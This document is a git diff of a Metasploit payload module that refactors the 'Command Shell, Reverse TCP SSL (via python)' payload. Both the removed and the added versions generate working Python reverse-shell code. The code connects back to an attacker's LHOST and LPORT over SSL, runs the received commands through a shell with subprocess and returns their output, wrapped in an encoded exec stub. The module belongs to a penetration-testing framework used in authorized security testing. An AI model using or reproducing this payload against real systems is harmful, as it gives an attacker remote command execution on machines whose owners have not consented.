@@ -3,40 +3,38 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/handler/reverse_tcp_ssl'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
-
 module MetasploitModule
-
-  CachedSize = 561
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
+  include Msf::Payload::Python
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Command Shell, Reverse TCP SSL (via python)',
-      'Description'   => 'Creates an interactive shell via python, uses SSL, encodes with base64 by design.',
-      'Author'        => 'RageLtMan <rageltman[at]sempervictus>',
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'python',
-      'Arch'          => ARCH_PYTHON,
-      'Handler'       => Msf::Handler::ReverseTcpSsl,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'python',
-      'Payload'       =>
-        {
-          'Offsets' => { },
+    super(
+      merge_info(
+        info,
+        'Name' => 'Command Shell, Reverse TCP SSL (via python)',
+        'Description' => 'Creates an interactive shell via Python, uses SSL, encodes with base64 by design. Compatible with Python 2.6-2.7 and 3.4+.',
+        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
+        'License' => BSD_LICENSE,
+        'Platform' => 'python',
+        'Arch' => ARCH_PYTHON,
+        'Handler' => Msf::Handler::ReverseTcpSsl,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'python',
+        'Payload' => {
+          'Offsets' => {},
           'Payload' => ''
         }
-      ))
+      )
+    )
   end
 
   #
   # Constructs the payload
   #
-  def generate
+  def generate(_opts = {})
     super + command_string
   end
 
@@ -44,26 +42,16 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    cmd = ''
-    dead = Rex::Text.rand_text_alpha(2)
-    # Set up the socket
-    cmd += "import socket,subprocess,os,ssl\n"
-    cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
-    cmd += "so.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
-    cmd += "s=ssl.wrap_socket(so)\n"
-    # The actual IO
-    cmd += "#{dead}=False\n"
-    cmd += "while not #{dead}:\n"
-    cmd += "\tdata=s.recv(1024)\n"
-    cmd += "\tif len(data)==0:\n\t\t#{dead} = True\n"
-    cmd += "\tproc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n"
-    cmd += "\tstdout_value=proc.stdout.read() + proc.stderr.read()\n"
-    cmd += "\ts.sendall(stdout_value)\n"
-
-    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
-    cmd = "exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))"
-
-    cmd
+    cmd  = "import socket as s,subprocess as r\n"
+    cmd += "so=s.socket(2,1)\n"
+    cmd += "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
+    cmd += py_ssl_wrap_socket('so')
+    cmd += "while True:\n"
+    cmd += "\td=so.recv(1024)\n"
+    cmd += "\tif len(d)==0:\n\t\tbreak\n"
+    cmd += "\tp=r.Popen(d.decode('utf-8'),shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)\n"
+    cmd += "\to=p.stdout.read()+p.stderr.read()\n"
+    cmd += "\tso.sendall(o)\n"
+    py_create_exec_stub(cmd)
   end
 end
-
